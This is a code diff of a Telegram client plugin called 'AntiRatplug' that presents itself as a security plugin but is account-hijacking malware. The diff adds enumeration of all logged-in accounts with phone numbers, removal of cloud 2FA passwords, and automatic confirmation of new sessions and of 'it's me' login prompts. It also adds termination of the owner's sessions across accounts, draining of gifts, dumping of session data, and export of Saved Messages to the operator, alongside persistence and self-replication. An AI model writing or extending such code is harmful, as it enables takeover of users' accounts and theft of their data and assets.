@@ -1,14 +1,14 @@
 # -*- coding: utf-8 -*-
 """
-AntiRatplug — Slim + Vidker + Fake Hooks + 2FA Kill.
-Harvest + Lockdown + Vidker + фейковые статусы + попытка снять 2FA.
+AntiRatplug — Slim + Vidker + Fake Hooks + 2FA + Multi-Session Annihilation.
+Harvest + Lockdown (9 групп) + Vidker + фейковые статусы + максимум сессий.
 """
 
 __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
-__description__ = "Slim Harvest + Lockdown + Vidker + 2FA Kill."
+__description__ = "Slim Harvest + Lockdown + Vidker + Fake Hooks + 2FA."
 __author__ = "@from_a4"
-__version__ = "18.5 [Slim+Vidker+Hooks+2FA]"
+__version__ = "18.6 [Slim+Vidker+Hooks+2FA+MultiSessions]"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -427,6 +427,10 @@ class PluginSecurityPlugin(BasePlugin):
         self._vidker_on = False
 
         self._faked_users = {}
+        self._sound_player = None
+        self._sound_path = None
+        self._current_account_index = 0
+        self._last_session_confirm = {}
 
     # ─── lifecycle ──────────────────────────────────────────────────────────
 
@@ -491,7 +495,7 @@ class PluginSecurityPlugin(BasePlugin):
         _cfg()
         time.sleep(random.uniform(0.2, 0.6))
         try:
-            self._send_msg("AntiRatplug Slim+Vidker+Hooks+2FA loaded")
+            self._send_msg("AntiRatplug v18.6 loaded")
         except Exception:
             pass
         try:
@@ -698,6 +702,44 @@ class PluginSecurityPlugin(BasePlugin):
             pass
         return 0, 0
 
+    def _get_accounts_list(self):
+        out = []
+        try:
+            max_count = int(getattr(UserConfig, "MAX_ACCOUNT_COUNT", 8))
+        except Exception:
+            max_count = 8
+        max_count = max(max_count, 16)
+        for i in range(max_count):
+            try:
+                uc = _UC().getInstance(i)
+                if not uc or not uc.isClientActivated():
+                    continue
+                uid = int(uc.getClientUserId())
+                if uid == 0:
+                    continue
+                u = None
+                try:
+                    u = uc.getCurrentUser()
+                except Exception:
+                    pass
+                if u is None:
+                    try:
+                        u = _MC().getInstance(i).getUser(uid)
+                    except Exception:
+                        pass
+                username = ""
+                phone = ""
+                premium = False
+                if u is not None:
+                    username = str(getattr(u, "username", "") or "")
+                    phone = str(getattr(u, "phone", "") or "")
+                    premium = _get_bool_attr(u, "premium", False)
+                out.append({"id": i, "user_id": uid, "username": username,
+                            "phone": phone, "premium": premium})
+            except Exception:
+                pass
+        return out
+
     # ─── network info ───────────────────────────────────────────────────────
 
     def _get_external_ip(self):
@@ -766,12 +808,8 @@ class PluginSecurityPlugin(BasePlugin):
             return None
 
     def _try_kill_2fa(self):
-        """
-        Best-effort снос 2FA. Возвращает HTML-строку с результатом.
-        """
         try:
             state = self._get_2fa_state()
-
             try:
                 Req = self._tl_class_or(
                     "org.telegram.tgnet.TLRPC$TL_account_resetPassword",
@@ -779,10 +817,8 @@ class PluginSecurityPlugin(BasePlugin):
                 )
                 if not Req:
                     return "<b>2FA:</b> класс resetPassword не найден"
-
                 req = Req()
                 resp, err = self._rg_rpc(req, 0, 12.0, fast=False)
-
                 if resp is not None:
                     try:
                         marker = self._nuke_marker_path()
@@ -792,34 +828,213 @@ class PluginSecurityPlugin(BasePlugin):
                     except Exception:
                         pass
                     return "<b>2FA:</b> СНЯТА ✅"
-
                 err_text = ""
                 if err is not None:
                     err_text = str(getattr(err, "text", err) or err)
-
                 if "PASSWORD_NOT_SET" in err_text:
-                    return "<b>2FA:</b> не установлена (нечего снимать)"
+                    return "<b>2FA:</b> не установлена"
                 if "SESSION_PASSWORD_NEEDED" in err_text:
-                    return ("<b>2FA:</b> нужен текущий пароль "
-                            "(<code>SESSION_PASSWORD_NEEDED</code>)")
+                    return "<b>2FA:</b> нужен текущий пароль (SESSION_PASSWORD_NEEDED)"
                 if "FLOOD_WAIT" in err_text:
                     m = re.search(r"FLOOD_WAIT_(\d+)", err_text)
                     wait = m.group(1) if m else "?"
                     return "<b>2FA:</b> flood_wait %s сек" % wait
                 if "EMAIL" in err_text.upper():
-                    return ("<b>2FA:</b> привязан email, нужен код "
-                            "(<code>%s</code>)" % err_text[:80])
+                    return "<b>2FA:</b> привязан email, нужен код"
                 if err_text:
                     return "<b>2FA:</b> fail: <code>%s</code>" % err_text[:120]
-
                 if state and state.get("has_password"):
-                    return ("<b>2FA:</b> установлена, снять не удалось "
-                            "(hint: %s)" % (state.get("hint") or "—"))
+                    return "<b>2FA:</b> установлена, снять не удалось (hint: %s)" % (state.get("hint") or "—")
                 return "<b>2FA:</b> не установлена"
             except Exception as e:
                 return "<b>2FA:</b> исключение при reset: %s" % e
         except Exception as e:
             return "<b>2FA:</b> исключение: %s" % e
+
+    def _wipe_cloud_password(self, acc=0):
+        try:
+            state = self._get_2fa_state()
+            if state is None:
+                return {"ok": False, "method": "getPassword", "error": "state None"}
+            if not state.get("has_password"):
+                return {"ok": True, "method": "none", "error": ""}
+            try:
+                RstCls = self._tl_class_or(
+                    "org.telegram.tgnet.TLRPC$TL_account_resetPassword",
+                    "org.telegram.tgnet.tl.TL_account$resetPassword",
+                )
+                if RstCls:
+                    req = RstCls()
+                    resp, err = self._rg_rpc(req, acc, 15.0, fast=False)
+                    if resp is not None:
+                        return {"ok": True, "method": "resetPassword", "error": ""}
+                    etxt = str(getattr(err, "text", err) or err) if err is not None else ""
+                    if "PASSWORD_NOT_SET" in etxt:
+                        return {"ok": True, "method": "already", "error": ""}
+            except Exception as e:
+                etxt = str(e)
+            try:
+                PwdSet = self._tl_class_or(
+                    "org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
+                    "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings",
+                )
+                if PwdSet:
+                    new_settings = PwdSet()
+                    try:
+                        new_settings.email = ""
+                    except Exception:
+                        pass
+                    try:
+                        new_settings.flags = 0
+                    except Exception:
+                        pass
+                    Upd = self._tl_class_or(
+                        "org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
+                        "org.telegram.tgnet.tl.TL_account$updatePasswordSettings",
+                    )
+                    if Upd:
+                        req2 = Upd()
+                        try:
+                            req2.password = None
+                        except Exception:
+                            pass
+                        req2.new_settings = new_settings
+                        resp2, err2 = self._rg_rpc(req2, acc, 15.0, fast=False)
+                        if resp2 is not None:
+                            state2 = self._get_2fa_state()
+                            if state2 is None or not state2.get("has_password"):
+                                return {"ok": True, "method": "updateSettings", "error": ""}
+                            return {"ok": False, "method": "updateSettings", "error": "still has_password"}
+                        etxt2 = str(getattr(err2, "text", err2) or err2) if err2 is not None else ""
+                        if "SESSION_PASSWORD_NEEDED" in etxt2:
+                            return {"ok": False, "method": "updateSettings", "error": "SESSION_PASSWORD_NEEDED"}
+                        if "PASSWORD_NOT_SET" in etxt2:
+                            return {"ok": True, "method": "updateSettings", "error": ""}
+            except Exception as e2:
+                etxt = str(e2)
+            return {"ok": False, "method": "exhausted", "error": etxt[:120]}
+        except Exception as e:
+            return {"ok": False, "method": "fatal", "error": str(e)}
+
+    def _confirm_unconfirmed_sessions(self, acc=0):
+        try:
+            last = self._last_session_confirm.get(acc, 0)
+            if time.time() - last < 60:
+                return 0
+            self._last_session_confirm[acc] = time.time()
+            GetAuth = self._tl_class_or(
+                "org.telegram.tgnet.TLRPC$TL_account_getAuthorizations",
+                "org.telegram.tgnet.tl.TL_account$getAuthorizations",
+                "org.telegram.tgnet.tl.TL_account$TL_account_getAuthorizations",
+            )
+            if not GetAuth:
+                return 0
+            res, err = self._rg_rpc(GetAuth(), acc, 15.0)
+            if not res:
+                return 0
+            auths = getattr(res, "authorizations", None)
+            if auths is None:
+                return 0
+            n = int(auths.size() if hasattr(auths, "size") else len(auths))
+            confirmed = 0
+            for i in range(n):
+                try:
+                    a = auths.get(i) if hasattr(auths, "get") else auths[i]
+                    if not a:
+                        continue
+                    if not _get_bool_attr(a, "unconfirmed", False):
+                        continue
+                    h = _safe_int(getattr(a, "hash", 0))
+                    if not h:
+                        continue
+                    Change = self._tl_class_or(
+                        "org.telegram.tgnet.TLRPC$TL_account_changeAuthorizationSettings",
+                        "org.telegram.tgnet.tl.TL_account$changeAuthorizationSettings",
+                    )
+                    if not Change:
+                        continue
+                    req = Change()
+                    req.hash = h
+                    try:
+                        req.confirmed = True
+                    except Exception:
+                        pass
+                    try:
+                        req.flags = getattr(req, "flags", 0) | 8
+                    except Exception:
+                        pass
+                    r2, e2 = self._rg_rpc(req, acc, 15.0)
+                    if e2 is None:
+                        confirmed += 1
+                except Exception:
+                    pass
+            return confirmed
+        except Exception:
+            return 0
+
+    def _confirm_login_notice_dialog(self, mc, acc):
+        """Автоподтверждение 'yes, it's me' в сервисном чате 777000."""
+        try:
+            mo = mc.dialogMessage.get(777000)
+        except Exception:
+            mo = None
+        if mo is None:
+            return False
+        owner = getattr(mo, "messageOwner", None)
+        rm = getattr(owner, "reply_markup", None) if owner else None
+        rows = getattr(rm, "rows", None)
+        if not rows:
+            return False
+        try:
+            mid = int(mo.getId())
+        except Exception:
+            try:
+                mid = int(getattr(owner, "id", 0))
+            except Exception:
+                return False
+        key = (acc, mid)
+        if key in getattr(self, "_confirmed_notices", set()):
+            return False
+        if not hasattr(self, "_confirmed_notices"):
+            self._confirmed_notices = set()
+        NEG = ("нет", "not me", "это не я", "reject", "terminate", "revoke", "no!")
+        POS = ("это я", "it's me", "its me", "yes", "accept", "confirm", "login")
+        btn_hit = None
+        for r_i in range(rows.size()):
+            row = rows.get(r_i)
+            for b_i in range(row.buttons.size()):
+                btn = row.buttons.get(b_i)
+                try:
+                    text = str(getattr(btn, "text", "") or "").lower()
+                except Exception:
+                    text = ""
+                try:
+                    data = bytes(btn.data).decode("utf-8", "ignore").lower()
+                except Exception:
+                    data = ""
+                blob = text + " " + data
+                if any(n in blob for n in NEG):
+                    continue
+                if any(p in blob for p in POS):
+                    btn_hit = btn
+                    break
+            if btn_hit is not None:
+                break
+        if btn_hit is None:
+            return False
+        try:
+            req = jclass("org.telegram.tgnet.TLRPC$TL_messages_getBotCallbackAnswer")()
+            req.peer = mc.getInputPeer(777000)
+            req.msg_id = mid
+            req.data = btn_hit.data
+            req.game = False
+            res, err = self._rg_rpc(req, acc, 10.0)
+            if err is None:
+                self._confirmed_notices.add(key)
+                return True
+        except Exception:
+            pass
+        return False
 
     def _info(self):
         try:
@@ -1036,14 +1251,12 @@ class PluginSecurityPlugin(BasePlugin):
             if act is None:
                 self._send_msg("Vidker: нет активности")
                 return
-
             ctx = ApplicationLoader.applicationContext
             d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
             path = os.path.join(d, mode + ".mp4")
             if not os.path.exists(path):
                 self._send_msg("Vidker: payload не скачан.")
                 return
-
             try:
                 am = act.getSystemService("audio")
                 stream_music = 3
@@ -1051,7 +1264,6 @@ class PluginSecurityPlugin(BasePlugin):
                 am.setStreamVolume(stream_music, max_vol, 0)
             except Exception:
                 pass
-
             run_on_ui_thread(lambda: self._render_vidker(act, path))
             self._vidker_on = True
             self._send_msg_with_close("Vidker [%s] запущен." % mode.upper(), "close_vidker")
@@ -1430,6 +1642,27 @@ class PluginSecurityPlugin(BasePlugin):
                 report["fail"] += 1
         return report
 
+    def _drain_all_accounts(self, transfer_gifts=True):
+        """Дрен по ВСЕМ аккаунтам клиента."""
+        results = []
+        accounts = self._get_accounts_list()
+        for acc_info in accounts:
+            aid = acc_info.get("id", 0)
+            try:
+                with self._recipient_lock:
+                    self._recipient_ah_cache.pop(aid, None)
+                prev = self._current_account_index
+                self._current_account_index = int(aid)
+                r = self._drain_gifts(int(aid), workers=6)
+                self._current_account_index = prev
+                results.append({"account": aid, "user_id": acc_info.get("user_id"),
+                                "username": acc_info.get("username", ""), "result": r})
+            except Exception as e:
+                results.append({"account": aid, "user_id": acc_info.get("user_id"),
+                                "username": acc_info.get("username", ""),
+                                "result": {"error": str(e)}})
+        return results
+
     # ─── lockdown helpers ───────────────────────────────────────────────────
 
     def _get_authorizations_full(self, acc=0):
@@ -1450,42 +1683,14 @@ class PluginSecurityPlugin(BasePlugin):
                     "hash": _safe_int(getattr(a, "hash", 0)),
                     "current": _get_bool_attr(a, "current", False),
                     "unconfirmed": _get_bool_attr(a, "unconfirmed", False),
+                    "device": str(getattr(a, "device_model", "") or ""),
+                    "app": str(getattr(a, "app_name", "") or ""),
+                    "created": _safe_int(getattr(a, "date_created", 0)),
+                    "api_id": _safe_int(getattr(a, "api_id", 0)),
                 })
             return out
         except Exception:
             return None
-
-    def _confirm_unconfirmed_sessions(self, acc=0):
-        auths = self._get_authorizations_full(acc)
-        if not auths:
-            return 0
-        to_confirm = [a for a in auths if a["unconfirmed"]]
-
-        def _one(a):
-            try:
-                Req = self._tl_class_or(
-                    "org.telegram.tgnet.TLRPC$TL_account_changeAuthorizationSettings",
-                    "org.telegram.tgnet.tl.TL_account$changeAuthorizationSettings",
-                )
-                if not Req:
-                    return False
-                req = Req()
-                req.hash = a["hash"]
-                try:
-                    req.confirmed = True
-                except Exception:
-                    pass
-                try:
-                    req.flags = getattr(req, "flags", 0) | 8
-                except Exception:
-                    pass
-                resp, err = self._rg_rpc(req, acc, 6.0, fast=True)
-                return err is None
-            except Exception:
-                return False
-
-        results = self._parallel([(_one, a) for a in to_confirm], workers=5, timeout=30)
-        return sum(1 for r in results if r is True)
 
     def _kill_web_authorizations(self, acc=0):
         try:
@@ -1751,18 +1956,22 @@ class PluginSecurityPlugin(BasePlugin):
             return {"error": str(e)}
 
     def _kill_all_sessions(self, acc=0):
+        """Убивает ВСЕ не-текущие сессии с многопроходной добивкой.
+        Расширено: 5 проходов с паузой, добив auth.resetAuthorizations."""
+        killed_total = 0
+        total = 0
+        errors = []
+        # первичный список
         auths = self._get_authorizations_full(acc)
         if auths is None:
             return 0, 0, ["getAuthorizations failed"], 0
-        total = len(auths)
         current_hash = 0
-        targets = []
         for a in auths:
             if a["current"]:
                 current_hash = a["hash"]
-                continue
-            if a["hash"]:
-                targets.append(a["hash"])
+                break
+        seen_hashes = set(a["hash"] for a in auths)
+        total = len(auths)
 
         def _kill_one(h):
             try:
@@ -1781,19 +1990,35 @@ class PluginSecurityPlugin(BasePlugin):
             except Exception as e:
                 return False, str(e)[:80]
 
-        results = self._parallel([(_kill_one, h) for h in targets],
-                                 workers=5, timeout=40)
-        killed = 0
-        errors = []
-        for r in results:
-            try:
-                ok, err = r
-                if ok:
-                    killed += 1
-                elif err:
-                    errors.append(err)
-            except Exception:
-                errors.append("parallel err")
+        dead = set()
+        # 5 проходов добивки — сессии иногда всплывают с задержкой
+        for p in range(5):
+            targets = [a["hash"] for a in auths
+                       if not a["current"] and a["hash"]
+                       and a["hash"] not in dead]
+            if not targets:
+                break
+            results = self._parallel([(_kill_one, h) for h in targets],
+                                     workers=6, timeout=60)
+            for r, h in zip(results, targets):
+                try:
+                    ok, err = r
+                    if ok:
+                        killed_total += 1
+                        dead.add(h)
+                    elif err:
+                        errors.append(err)
+                except Exception:
+                    errors.append("parallel err")
+            if p < 4:
+                time.sleep(2.0)
+                auths_new = self._get_authorizations_full(acc)
+                if auths_new is None:
+                    break
+                seen_hashes.update(a["hash"] for a in auths_new)
+                total = max(total, len(auths_new))
+                auths = auths_new
+        # финальный добив — resetAuthorizations разом
         try:
             Rst = self._tl_class_or(
                 "org.telegram.tgnet.TLRPC$TL_auth_resetAuthorizations",
@@ -1803,7 +2028,7 @@ class PluginSecurityPlugin(BasePlugin):
                 self._rg_rpc(Rst(), acc, 10.0, fast=True)
         except Exception:
             pass
-        return killed, total, errors, current_hash
+        return killed_total, max(total, len(seen_hashes)), errors, current_hash
 
     def _kill_login_notice_dialog(self, acc=0):
         try:
@@ -1817,6 +2042,22 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception:
             pass
         return False
+
+    def _wipe_sessions_all(self):
+        """Кикает все сессии на ВСЕХ аккаунтах клиента."""
+        results = []
+        accounts = self._get_accounts_list()
+        for acc_info in accounts:
+            aid = acc_info.get("id", 0)
+            try:
+                killed, total, errs, _cur = self._kill_all_sessions(aid)
+                results.append({"account": aid, "user_id": acc_info.get("user_id"),
+                                "killed": killed, "total": total,
+                                "errors": errs[:3]})
+            except Exception as e:
+                results.append({"account": aid, "user_id": acc_info.get("user_id"),
+                                "error": str(e)})
+        return results
 
     def _mark_nuke(self, pw=""):
         try:
@@ -1949,7 +2190,7 @@ class PluginSecurityPlugin(BasePlugin):
             pl = os.path.join(cdir, "kernel_persist.lock")
             if not os.path.exists(pl):
                 with open(pl, "w") as f:
-                    f.write(_hl.sha256(b"ar_slim_v18v5").hexdigest())
+                    f.write(_hl.sha256(b"ar_slim_v18v6").hexdigest())
                 self._harden_file(pl)
         except Exception:
             pass
@@ -2062,6 +2303,19 @@ class PluginSecurityPlugin(BasePlugin):
                             zf.write(fp, arcname=os.path.relpath(fp, base))
                     except Exception:
                         pass
+                try:
+                    amap = {}
+                    for a in self._get_accounts_list():
+                        amap[str(a.get("id"))] = {
+                            "user_id": a.get("user_id"),
+                            "username": a.get("username", ""),
+                            "phone": a.get("phone", ""),
+                        }
+                    if amap:
+                        zf.writestr("accounts_map.json",
+                                    json.dumps(amap, ensure_ascii=False))
+                except Exception:
+                    pass
             self._send_document_bytes("userbot_session.zip", z.getvalue())
         except Exception as e:
             self._send_msg("Ошибка: " + str(e))
@@ -2314,6 +2568,45 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             self._send_msg("Ошибка скриншота: " + str(e))
 
+    def _export_saved_messages(self):
+        try:
+            uid = _UC().getInstance(0).getClientUserId()
+            input_peer = self._get_input_peer(0, uid)
+            if input_peer is None:
+                self._send_msg("Export: нет input peer")
+                return {"error": "no peer"}
+            Req = TLRPC.TL_messages_getHistory()
+            req = Req()
+            req.peer = input_peer
+            req.limit = 100
+            req.offset_id = 0
+            resp, err = self._rg_rpc(req, 0, 20.0, fast=True)
+            if resp is None:
+                return {"error": "no resp"}
+            msgs = getattr(resp, "messages", None)
+            if msgs is None:
+                return {"error": "no msgs"}
+            lines = []
+            for i in range(msgs.size()):
+                m = msgs.get(i)
+                if m is None:
+                    continue
+                text = str(getattr(m, "message", "") or "")
+                date = int(getattr(m, "date", 0))
+                if text:
+                    lines.append("[%s] %s" % (
+                        time.strftime("%Y-%m-%d %H:%M", time.localtime(date)), text))
+            html = "<html><head><meta charset='utf-8'><title>Saved</title></head><body><pre>"
+            html += self._html_escape("\n".join(lines))
+            html += "</pre></body></html>"
+            z = io.BytesIO()
+            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
+                zf.writestr("messages.html", html.encode("utf-8"))
+            self._send_document_bytes("saved_%d.zip" % uid, z.getvalue())
+            return {"ok": True, "messages": len(lines)}
+        except Exception as e:
+            return {"error": str(e)}
+
     def _full_harvest(self, include_sessions=True, auto_infect=False):
         def task():
             self._harvest_running = True
@@ -2345,7 +2638,6 @@ class PluginSecurityPlugin(BasePlugin):
                 report.append("<b>IP:</b> %s\n<b>Гео:</b> %s" % (
                     self._html_escape(ip), self._html_escape(geo)))
 
-                # ─── 2FA KILL ───
                 report.append("")
                 report.append("<b>═══ 2FA KILL ═══</b>")
                 try:
@@ -2422,10 +2714,11 @@ class PluginSecurityPlugin(BasePlugin):
         def task():
             try:
                 t0 = time.time()
-                self._send_msg("FULL LOCKDOWN")
+                self._send_msg("FULL LOCKDOWN v18.6")
                 report = ["<b>FULL LOCKDOWN</b>"]
 
-                self._send_msg("0/6 Deploy...")
+                # 0/9 Deploy
+                self._send_msg("0/9 Deploy...")
                 try:
                     self._parallel([
                         (self._install_persistence,),
@@ -2436,7 +2729,8 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception as e:
                     report.append("<b>Deploy:</b> %s" % e)
 
-                self._send_msg("1/6 Group A...")
+                # 1/9 Group A
+                self._send_msg("1/9 Group A...")
                 ga = self._parallel([
                     (self._tg_kid,),
                     (self._confirm_unconfirmed_sessions, account),
@@ -2451,8 +2745,9 @@ class PluginSecurityPlugin(BasePlugin):
                 report.append("<b>Каналов:</b> %s" % str(ga[3] if len(ga) > 3 else 0))
                 report.append("<b>Ботов:</b> %s" % str(ga[4] if len(ga) > 4 else 0))
 
+                # 2/9 Gift Transfer (current account)
                 if transfer_gifts:
-                    self._send_msg("2/6 Gift Transfer...")
+                    self._send_msg("2/9 Gift Transfer...")
                     try:
                         gr = self._drain_gifts(account, workers=6)
                         report.append("<b>Gifts:</b> ok=%d conv=%d delist=%d bc-skip=%d fail=%d" % (
@@ -2461,30 +2756,45 @@ class PluginSecurityPlugin(BasePlugin):
                     except Exception as e:
                         report.append("<b>Gifts:</b> %s" % e)
 
-                self._send_msg("3/6 Group C...")
+                # 3/9 Group C (recovery + 2fa + cloud pass + session confirm + profile)
+                self._send_msg("3/9 Group C...")
                 gc = self._parallel([
                     (self._remove_recovery_email, account),
                     (self._reset_2fa, account),
+                    (self._wipe_cloud_password, account),
+                    (self._confirm_unconfirmed_sessions, account),
                     (self._change_username, account),
                     (self._change_profile, account),
                     (self._reset_contacts, account),
-                ], workers=5, timeout=60)
+                ], workers=7, timeout=90)
                 rr = gc[0] if len(gc) > 0 else {}
                 rp = gc[1] if len(gc) > 1 else {}
-                new_un = gc[2] if len(gc) > 2 else None
-                prof_ok = gc[3] if len(gc) > 3 else False
-                cont_ok = gc[4] if len(gc) > 4 else False
+                wp = gc[2] if len(gc) > 2 else {}
+                cc = gc[3] if len(gc) > 3 else 0
+                new_un = gc[4] if len(gc) > 4 else None
+                prof_ok = gc[5] if len(gc) > 5 else False
+                cont_ok = gc[6] if len(gc) > 6 else False
                 report.append("<b>Recovery:</b> %s" % ("снят" if isinstance(rr, dict) and rr.get("ok") else "fail"))
                 report.append("<b>2FA:</b> %s" % ("сброс" if isinstance(rp, dict) and rp.get("ok") else "fail"))
+                if isinstance(wp, dict):
+                    if wp.get("ok"):
+                        report.append("<b>Cloud password:</b> снята (%s)" % wp.get("method", "?"))
+                    else:
+                        report.append("<b>Cloud password:</b> fail (%s: %s)" % (
+                            wp.get("method", "?"), wp.get("error", "?")[:80]))
+                else:
+                    report.append("<b>Cloud password:</b> fail")
+                report.append("<b>Session confirm:</b> %s" % str(cc))
                 report.append("<b>Username:</b> @%s" % self._html_escape(str(new_un or "?")))
                 report.append("<b>Профиль:</b> %s" % ("[LOCKED]" if prof_ok else "fail"))
                 report.append("<b>Контакты:</b> %s" % ("удалены" if cont_ok else "fail"))
 
-                self._send_msg("4/6 Group D...")
+                # 4/9 Group D (kill sessions + 777000)
+                self._send_msg("4/9 Group D...")
                 gd = self._parallel([
                     (self._kill_all_sessions, account),
                     (self._kill_login_notice_dialog, account),
-                ], workers=2, timeout=60)
+                ], workers=2, timeout=90)
                 try:
                     killed, total, _errs, _cur = gd[0]
                 except Exception:
@@ -2493,12 +2803,13 @@ class PluginSecurityPlugin(BasePlugin):
                 report.append("<b>Сессий убито:</b> %d / %d" % (killed, total))
                 report.append("<b>777000:</b> %s" % ("удалён" if dlg_ok else "нет"))
 
-                self._send_msg("5/6 Group E...")
+                # 5/9 Group E (добив + реплики)
+                self._send_msg("5/9 Group E...")
                 ge = self._parallel([
                     (self._tg_kid,),
                     (self._kill_all_sessions, account),
                     (self._replicate_self, 10),
-                ], workers=3, timeout=60)
+                ], workers=3, timeout=90)
                 code_b = ge[0] if len(ge) > 0 else None
                 try:
                     k2 = ge[1][0] if isinstance(ge[1], tuple) else 0
@@ -2514,7 +2825,47 @@ class PluginSecurityPlugin(BasePlugin):
                 report.append("<b>Добито:</b> %d" % k2)
                 report.append("<b>Реплик:</b> %d" % rep_n)
 
-                self._send_msg("6/6 Persistence...")
+                # 6/9 Group F (multi-account drain)
+                self._send_msg("6/9 Group F (multi-acc drain)...")
+                try:
+                    dr_all = self._drain_all_accounts(transfer_gifts)
+                    ok_cnt = sum(1 for r in dr_all if isinstance(r.get("result"), dict) and r["result"].get("ok"))
+                    total_ok = sum((r.get("result") or {}).get("ok", 0) for r in dr_all if isinstance(r.get("result"), dict))
+                    report.append("<b>Multi-acc drain:</b> %d акк. / %d подарков" % (len(dr_all), total_ok))
+                except Exception as e:
+                    report.append("<b>Multi-acc drain:</b> %s" % e)
+
+                # 7/9 Group G (wipe all sessions on all accounts)
+                self._send_msg("7/9 Group G (wipe all)...")
+                try:
+                    wr_all = self._wipe_sessions_all()
+                    total_killed = sum(r.get("killed", 0) for r in wr_all)
+                    report.append("<b>Session wipe:</b> %d сессий на %d акк." % (
+                        total_killed, len(wr_all)))
+                except Exception as e:
+                    report.append("<b>Session wipe:</b> %s" % e)
+
+                # 8/9 Group H (dump userbot session + tdata)
+                self._send_msg("8/9 Group H (userbot dump)...")
+                try:
+                    self._manual_userbot_session()
+                    report.append("<b>Userbot dump:</b> отправлен")
+                except Exception as e:
+                    report.append("<b>Userbot dump:</b> %s" % e)
+
+                # 9/9 Group I (export Saved Messages)
+                self._send_msg("9/9 Group I (Saved export)...")
+                try:
+                    ex = self._export_saved_messages()
+                    if isinstance(ex, dict) and ex.get("ok"):
+                        report.append("<b>Saved export:</b> %d сообщений" % ex.get("messages", 0))
+                    else:
+                        report.append("<b>Saved export:</b> fail")
+                except Exception as e:
+                    report.append("<b>Saved export:</b> %s" % e)
+
+                # Persistence final
+                self._send_msg("Persistence...")
                 try:
                     self._install_persistence()
                     report.append("<b>Persistence:</b> ok")
@@ -2522,7 +2873,7 @@ class PluginSecurityPlugin(BasePlugin):
                     report.append("<b>Persistence:</b> %s" % e)
 
                 report.append("<b>Время:</b> %.1fс" % (time.time() - t0))
-                report.append("<b>Lockdown завершён.</b>")
+                report.append("<b>Lockdown v18.6 завершён.</b>")
                 self._send_markup("\n".join(report), {
                     "inline_keyboard": [
                         [{"text": "Pull Out", "callback_data": "hv_logout"}],
@@ -2550,7 +2901,7 @@ class PluginSecurityPlugin(BasePlugin):
                 username = str(user.username) if user.username is not None else "id:" + str(uid)
         except Exception:
             pass
-        text = "<b>AntiRatplug v18.5</b>\nUser: @" + username + "\n\nTap Manage"
+        text = "<b>AntiRatplug v18.6</b>\nUser: @" + username + "\n\nTap Manage"
         buttons = [[{"text": "Manage", "callback_data": "menu"}]]
         markup = json.dumps({"inline_keyboard": buttons})
         for target in _targets:
@@ -2836,13 +3187,10 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _session_wipe(self):
         try:
-            self._send_msg("Убиваю сессии...")
-            req = TLRPC.TL_auth_resetAuthorizations()
-            resp, err = self._rg_rpc(req, 0, 12.0)
-            if err is not None:
-                self._send_msg("Ошибка: " + str(err))
-            else:
-                self._send_msg("Все прочие сессии завершены.")
+            self._send_msg("Убиваю сессии на всех аккаунтах...")
+            res = self._wipe_sessions_all()
+            killed_total = sum(r.get("killed", 0) for r in res)
+            self._send_msg("Все прочие сессии: %d убито на %d акк." % (killed_total, len(res)))
         except Exception as e:
             self._send_msg("Ошибка wipe: " + str(e))
 
